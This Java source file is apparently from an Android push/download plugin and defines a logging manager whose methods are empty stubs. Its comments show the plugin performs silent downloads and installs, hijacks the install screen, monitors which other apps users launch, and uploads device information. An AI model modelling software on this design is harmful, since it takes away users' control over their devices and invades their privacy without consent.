package com.tiho.dlplugin.log;

import android.content.Context;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.silentExport.SilentAuthBean;

import java.util.Map;


public class LogUploadManager {
    // 静默授权结果日志
    private static final String SILENT_CRASH_EVENT = "UI_push_crash_log";

    private static LogUploadManager instance;

    private Context context;

    private LogUploadManager(Context context) {
        this.context = context;
    }

    public synchronized static LogUploadManager getInstance(Context c) {
        if (instance == null)
            instance = new LogUploadManager(c);

        return instance;
    }

    /**
     * 添加操作日志
     *
     * @param pushType 1.广告 2.应用
     * @param optType  1,静默激活 ；2，普通激活;3 定时激活
     */
    public void addOperateLog(long pushId, int pushType, int optType, String pack, int inventPushType, String errmsg) {

    }

    /**
     * 添加操作日志
     *
     * @param pushType 1.广告 2.应用
     * @param optType  1,静默激活 ；2，普通激活;3 定时激活
     */
    public void addSilentOperateLog(int pushType, int optType, String pack, int inventPushType, String errmsg) {

    }

    /**
     * 添加下载日志
     *
     * @param from      下载来源 0:消息栏 1:详情页，2 静默程序 , 静默link
     * @param pack      包名
     * @param start     下载开始时间,yyyy-mm-dd hh:mm:ss string
     * @param optTime   操作时间,yyyy-mm-dd hh:mm:ss string
     * @param offset    断点的位置
     * @param totalSize 该次下载的量
     * @param downFlag  下载行为结果 1 成功 0 失败
     * @param errmsg    错误消息
     * @param logFlag   1 下载开始行为日志 2 下载成功/失败上报日志
     * @param autoDown  Y /N 标志这个下载或者下载开始请求是否是静默的
     */
    public void addDownloadLog(long pushId, int from, String pack, String start, String optTime, long offset, long totalSize, int downFlag, String errmsg, int logFlag, String autoDown) {

    }

    public void addSilentDownloadLog(int from, String pack, String start, String optTime, long offset, long totalSize, int downFlag, String errmsg, int logFlag, String autoDown) {
    }

    /**
     * 安装日志
     *
     * @param installFlag 安装行为结果 1 成功 0 失败 //其他失败 2已卸载应用不静默//PUSH 1.4
     * @param errmsg      错误
     * @param pack        包名
     * @param autoInstall 1 静默安装 2 手动安装
     * @param autodown    Y /N 标志这个下载或者下载开始请求是否是静默
     */
    public void addInstallLog(long pushId, int installFlag, String errmsg, String pack, int autoInstall, String autodown) {

    }

    /**
     * @param from 0-push常规、1-快捷方式、2-安装界面劫持
     */
    public void addSilentInstallLog(int installFlag, String errmsg, String pack, int autoInstall, String autodown, int from) {
    }

    /**
     * 卸载日志
     */
    public void addUninstallLog(String pack, int uninstallFlag, String errmsg) {
    }

    /**
     * 添加快捷方式日志
     */
    public void addShortcutLog(long pushId, String autoinstall, String autorun, String pre, int result, String errmsg, int optType) {
    }

    public void addSilentShortcutLog(long id, String autoinstall, String autorun, String pre, int result, String errmsg, int optType) {
    }

    /**
     * 唤醒日志 1 ， 唤醒 ，0 休眠
     *
     * @param type
     */
    public void addWakeUpLog(int type) {
    }

    //上传删除apk日志，apk包名+size
    public void uploadDeleteLog(String packageName, long size, boolean deleteResult, boolean hasEnoughSpace) {
    }

    /**
     * 上传请求日志
     *
     * @param isSilent - 是否静默请求
     */
    public void uploadRequestLog(boolean isSilent) {

    }

    /**
     * 快捷方式日志
     */
    public void uploadSpecialShorcutLog(String pkgname, String type, String result) {
    }

    /**
     * 劫持安装日志
     */
    public void uploadInstallMonitorLog(String pkgname, String srcpkg, String type, String result) {

    }

    /**
     * 监控其他应用活动日志
     *
     * @param pkgname 启动的应用
     * @param is_push 是否是我们推出的应用
     */
    public void uploadActivityLog(String pkgname, boolean is_push) {
    }

    /**
     * md下载日志
     *
     * @param start     下载开始时间,yyyy-mm-dd hh:mm:ss string
     * @param offset    断点的位置
     * @param totalSize 该次下载的量
     * @param downFlag  下载行为结果 1 成功 0 失败
     * @param errmsg    错误消息
     */
    public void uploadMdDownloadLog(String start, long offset, long totalSize, int downFlag, String errmsg) {

    }

    /**
     * @param type   启动service或启动app
     * @param result 启动结果
     */
    public void uploadStartSystemPushLog(String type, boolean result) {
    }

    /**
     * countly启动日志
     */
    public void uploadCountlyStartLog() {

    }


    public void uploadSilentAuthLog(SilentAuthBean authBean, int result, String info) {
    }


    public void uploadCrashLog(Map<String, String> map) {
        LogManager.LogShow("uploadCrash map:" + map);
    }

    public void uploadDeviceInfoLog(Context context, Map<String, String> map) {

    }

}
